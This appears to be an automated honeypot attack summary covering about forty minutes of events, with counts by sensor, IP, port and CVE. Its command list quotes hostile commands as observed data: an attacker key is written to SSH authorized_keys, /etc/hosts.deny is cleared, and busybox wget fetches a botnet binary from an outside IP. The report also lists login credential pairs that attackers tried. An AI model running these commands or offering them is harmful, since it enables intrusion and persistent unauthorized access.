Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-14T12:01:26Z
**Timeframe:** 2025-10-14T11:20:01Z to 2025-10-14T12:00:01Z
**Log Files:**
- agg_log_20251014T112001Z.json
- agg_log_20251014T114001Z.json
- agg_log_20251014T120001Z.json

**Executive Summary:**
This report summarizes 23,681 events collected from the honeypot network over a 40-minute period. The majority of attacks were captured by the Cowrie honeypot, with significant activity also observed on Mailoney and Honeytrap. Attackers predominantly targeted port 5060 (SIP) and port 25 (SMTP). The most frequent attacks originated from IP address 86.54.42.238. A variety of CVEs were targeted, and attackers attempted numerous system reconnaissance and malware download commands.

**Detailed Analysis:**

***

**Attacks by Honeypot:**
*   **Cowrie:** 10,105
*   **Honeytrap:** 3,594
*   **Sentrypeer:** 3,026
*   **Mailoney:** 2,578
*   **Dionaea:** 1,122
*   **Ciscoasa:** 1,703
*   **Suricata:** 1,306
*   **Redishoneypot:** 54
*   **Tanner:** 49
*   **H0neytr4p:** 62
*   **Adbhoney:** 23
*   **Honeyaml:** 25
*   **ConPot:** 13
*   **Miniprint:** 10
*   **ElasticPot:** 9
*   **Dicompot:** 2

**Top Attacking IPs:**
*   86.54.42.238: 1,642
*   206.191.154.180: 1,330
*   157.230.169.149: 1,243
*   45.91.193.63: 1,126
*   185.243.5.146: 1,121
*   143.44.164.239: 828
*   185.243.5.148: 744
*   45.236.188.4: 513
*   45.165.14.192: 439
*   172.86.95.98: 404
*   172.86.95.115: 392
*   88.210.63.16: 389
*   103.124.92.110: 367
*   95.173.160.2: 332
*   4.240.110.22: 414
*   15.206.55.26: 373
*   34.85.163.94: 324
*   217.156.66.138: 231
*   122.175.19.236: 227
*   62.141.43.183: 216

**Top Targeted Ports/Protocols:**
*   5060: 3,026
*   25: 2,580
*   22: 1,446
*   445: 1,066
*   5903: 187
*   8333: 119
*   5908: 82
*   5909: 86
*   6379: 54
*   5901: 74
*   80: 59
*   443: 77
*   4000: 33
*   5907: 48
*   1434: 34
*   TCP/1433: 15
*   23: 16
*   TCP/80: 26
*   UDP/161: 22
*   27017: 20

**Most Common CVEs:**
*   CVE-2002-0013 CVE-2002-0012
*   CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
*   CVE-1999-0183
*   CVE-2019-11500 CVE-2019-11500
*   CVE-2006-2369
*   CVE-1999-0517

**Commands Attempted by Attackers:**
*   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
*   `lockr -ia .ssh`
*   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
*   `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
*   `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
*   `ls -lh $(which ls)`
*   `which ls`
*   `crontab -l`
*   `w`
*   `uname -m`
*   `uname -a`
*   `whoami`
*   `lscpu | grep Model`
*   `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
*   `cat /proc/cpuinfo | grep model | grep name | wc -l`
*   `top`
*   `uname`
*   `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
*   `Enter new UNIX password: `
*   `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

**Signatures Triggered:**
*   ET DROP Dshield Block Listed Source group 1
*   2402000
*   ET SCAN MS Terminal Server Traffic on Non-standard Port
*   2023753
*   ET SCAN NMAP -sS window 1024
*   2009582
*   ET HUNTING RDP Authentication Bypass Attempt
*   2034857
*   ET INFO Reserved Internal IP Traffic
*   2002752

**Users / Login Attempts:**
*   345gs5662d34/345gs5662d34
*   root/3245gs5662d34
*   root/Password@2025
*   root/123@@@
*   root/Qaz123qaz
*   ubnt/ubnt000
*   ftpuser/ftppassword
*   debian/1234567
*   root/4tr5b8x
*   centos/8888

**Files Uploaded/Downloaded:**
*   arm.urbotnetisass;
*   arm.urbotnetisass
*   arm5.urbotnetisass;
*   arm5.urbotnetisass
*   arm6.urbotnetisass;
*   arm6.urbotnetisass
*   arm7.urbotnetisass;
*   arm7.urbotnetisass
*   x86_32.urbotnetisass;
*   x86_32.urbotnetisass
*   mips.urbotnetisass;
*   mips.urbotnetisass
*   mipsel.urbotnetisass;
*   mipsel.urbotnetisass
*   wget.sh;
*   w.sh;
*   c.sh;
*   bot.html)
*   ?format=json

**HTTP User-Agents:**
*   *None observed in this period.*

**SSH Clients and Servers:**
*   *None observed in this period.*

**Top Attacker AS Organizations:**
*   *None observed in this period.*

**Key Observations and Anomalies:**
- A significant amount of reconnaissance activity was observed, with attackers frequently using commands like `uname -a`, `lscpu`, and `cat /proc/cpuinfo`.
- A recurring pattern involves attempts to download and execute shell scripts (`w.sh`, `c.sh`, `wget.sh`) and binary files (`.urbotnetisass`), suggesting automated malware infection campaigns.
- The command to add a public SSH key to `authorized_keys` was seen multiple times, indicating attempts to establish persistent access.
- There is a strong focus on SIP (5060) and SMTP (25) ports, which is typical for reconnaissance and exploitation attempts against communication servers.
- The variety in targeted CVEs shows that attackers are using a broad set of exploits to target different vulnerabilities.
